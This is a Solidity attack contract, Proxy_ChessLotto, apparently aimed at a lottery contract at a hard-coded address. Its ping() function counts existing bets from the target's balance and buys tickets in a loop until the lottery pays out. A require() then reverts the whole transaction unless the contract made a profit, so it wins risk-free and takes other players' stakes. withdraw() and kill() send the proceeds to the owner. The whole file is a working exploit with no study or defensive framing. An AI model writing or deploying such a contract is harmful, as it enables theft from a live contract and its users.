pragma solidity ^0.5.0;

contract TargetInterface {
    function AddTicket() public payable;
}

contract Proxy_ChessLotto {
    
    address targetAddress = 0x309dFE127881922C356Fe8F571846150768C551e;
    uint256 betSize = 0.00064 ether;

    address payable private owner;
    
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    
    constructor() public payable {
        owner = msg.sender;
    }
    
    function ping(bool _keepBalance) public payable onlyOwner {
        uint256 targetBalanceInitial = address(targetAddress).balance;
        uint256 existingBetsInitial = targetBalanceInitial / betSize;
        require(existingBetsInitial > 0);
        
        uint256 ourBalanceInitial = address(this).balance;
        
        TargetInterface target = TargetInterface(targetAddress);
    
        uint256 ourBetCount = 64 - existingBetsInitial;

        for (uint256 ourBetIndex = 0; ourBetIndex < ourBetCount; ourBetIndex++) {
            target.AddTicket.value(betSize)();
            
            if (address(targetAddress).balance < targetBalanceInitial) {
                break;
            }
        }
        
        require(address(this).balance > ourBalanceInitial);
        
        if (!_keepBalance) {
            owner.transfer(address(this).balance);
        }
    }

    function withdraw() public onlyOwner {
        owner.transfer(address(this).balance);
    }    
    
    function kill() public onlyOwner {
        selfdestruct(owner);
    }    
    
    function () external payable {
    }
    
}